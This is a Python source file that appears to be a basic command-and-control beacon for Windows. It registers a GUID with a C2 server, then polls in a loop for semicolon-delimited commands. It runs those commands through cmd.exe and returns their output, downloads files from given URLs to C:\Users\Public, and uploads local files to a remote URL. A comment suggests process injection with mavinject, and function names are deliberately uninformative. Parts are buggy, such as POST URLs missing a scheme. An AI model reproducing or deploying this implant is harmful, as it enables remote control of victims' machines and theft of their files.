import subprocess
from subprocess import PIPE
import uuid
import psutil
import requests
import time
import base64

#time.sleep(10)


def get_pid(process_name):
    """
    Takes in a process name
    Returns a process ID
    """
    for proc in psutil.process_iter():
        if proc.name() == process_name:
            return proc.pid


def bleh(beacon_command):
    """
    This takes in a string to execute
    Returns the output if any available
    """
    DETACHED_PROCESS = 0x00000008  # For console processes, the new process does not inherit its parent's console
    # https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags?redirectedfrom=MSDN
    command = ['cmd.exe', '/C', beacon_command]
    process = subprocess.Popen(command, close_fds=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    out = out.decode()
    return out


def blehhh(filePath, url="http://httpbin.org/post"):
    '''
    Takes in a URL and filepath
    '''
    uploadFile = open(filePath, 'rb')
    uploadUrl = url
    status = requests.post(uploadUrl, files={"Files": uploadFile})


def blehhhh(url, ext):
    """
    This takes in a url and ext to download from
    The extension is required for when saving it
    """
    r = requests.get(url)
    open(f'C:\\Users\\Public\\test{ext}', 'wb').write(r.content)


GUID = uuid.uuid4()
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 ',
    'APPSESSIONID':f'{GUID}'
}
# Send our HELLO/GUID
requests.get(f'http://127.0.0.1:5000/', headers=headers)
 
# Below is the cert requirements for mTLS when using requests
# , cert=('client.crt', 'client.key'), verify='ca.crt'
time.sleep(60)
while 1:
    a = requests.get(f'http://127.0.0.1:80/{GUID}.html', headers=headers)
    cmd = a.text
    print('got command')
    print(cmd)
    op = cmd.split(';')[0]
    cm = cmd.split(';')[1]
    ex = cmd.split(';')[2]
    enc = cmd.split(';')[3]

    if op == 'cmd':
        returned = bleh(cm)
        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
    if op == 'inject': # We can use mavinject from cmd prompt
        returned = bleh(cm)
        response = requests.post('127.0.0.1/returned', data=returned, headers=headers)
    if op == 'download':
        blehhhh(cm, ex)
    if op == 'upload':
        blehhh(cm, ex)
    else:
        print('nada')
    time.sleep(20)

